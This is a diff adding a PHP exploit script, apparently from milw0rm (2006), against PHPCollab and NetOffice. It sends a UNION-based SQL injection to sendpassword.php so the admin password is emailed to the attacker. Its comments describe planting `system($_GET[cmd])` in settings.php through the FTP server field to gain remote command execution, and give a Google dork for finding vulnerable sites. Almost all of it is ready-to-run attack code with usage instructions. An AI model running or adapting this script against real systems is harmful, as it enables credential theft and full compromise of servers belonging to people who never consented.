@@ -1,0 +1,173 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "PHPCollab v2.x / NetOffice v2.x sendpassword.php SQL Injection \r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n\r\n";
+echo "-> works with magic_quotes_gpc = Off\r\n\r\n";
+echo "a googledork: intitle:phpcollab|netoffice \"index of\" -www-apps -php-collab.org -ext:xml\r\n\r\n";
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path email OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to NetOffice or PHPCollab\r\n";
+echo "email:     your email\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /NetOffice/ youremail@somehost.com\n";
+echo "php ".$argv[0]." localhost /PhpCollab/ youremail@somehost.com -p81\r\n";
+echo "php ".$argv[0]." localhost / youremail@somehost.com -P1.1.1.1:80\r\n";
+die;
+}
+
+/* explaination:
+
+   tested & working against: PhpCollab v2.4
+			     PhpCollab v2.5 rc3
+	                     NetOffice v2.5.3-pl1
+	                     NetOffice v2.6.0b2
+   vulnerability;
+
+   SQL injection in "forgotten password" feature:
+   if magic_quotes_gpc=Off you can send yourself the admin (md5(), crypt() or
+   plain text) password, poc:
+   you can submit a "loginForm" POST value like this to general/sendpassword.php
+   script :
+
+  'UNION SELECT id,1,CONCAT('this is the real password (encrypted with md5(),
+  crypt() or in plain text): ',password),password,name,title,'[your email here]'
+  ,null,'','','','',null,1,'2006-03-27 20:48',0,'administration/admin.php','',''
+  ,null FROM members mem WHERE id=1/*
+
+  query becomes:
+   SELECT mem.*, org.name, log.connected FROM members mem LEFT OUTER JOIN
+   organizations org ON org.id = mem.organization LEFT OUTER JOIN logs log ON
+   log.login = mem.login  WHERE mem.login = ''UNION SELECT id,1,CONCAT('this is
+   the real password (encrypted with md5(),crypt() or in plain text): ',password
+   ),password,name,title,'[your email]',null,'','','','',null,1,'2006-03-27 20:
+   48',0,'administration/admin.php','','',null FROM members mem WHERE id=1/*'
+
+  you will receive soon a mail like this:
+
+  Username : this is the real password (encrypted with md5(),crypt() or in plain text): [password]
+  password : [random generated password]
+
+  ignore password field, password is not changed, 'cause the UPDATE query fails,
+  but the real one is showed in Username mail field.
+
+  once you are admin, you can inject arbitrary code in settings.php
+  (you know, magic_quotes_gpc is off), poc:
+  login, go to "Edit settings" feature, in FTP SERVER field type:
+
+  '); system($_GET[cmd]); print ('
+
+  in settings.php, near line 38, you have:
+
+  ...
+  define('FTPSERVER',''); system($_GET[cmd]); print ('');
+  ...
+
+  so you can launch commands, ex:
+
+  http://[target]/[path]/general/login.php?cmd=ls%20-la
+									      */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$your_email="";
+$port=80;
+$proxy="";
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$your_email.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy<>'') {$p="http://".$host.":".$port.$path;} else {$p=$path;}
+
+$sql ="'UNION SELECT id,1,CONCAT('this is the real password (encrypted with md5()";
+$sql.=",crypt() or in plain text): ',password),password,name,title,'".$your_email;
+$sql.="',null,'','','','',null,1,'2006-03-27 20:48',0,'administration/admin.php',";
+$sql.="'','',null FROM members mem WHERE id=1/*";
+$sql=urlencode($sql);
+$data="loginForm=".$sql;
+$packet ="POST ".$p."general/sendpassword.php?action=send HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+#debug
+echo quick_dump($packet);
+sendpacketii($packet);
+echo "Now check your mailbox...";
+?>
+
+# milw0rm.com [2006-03-28]
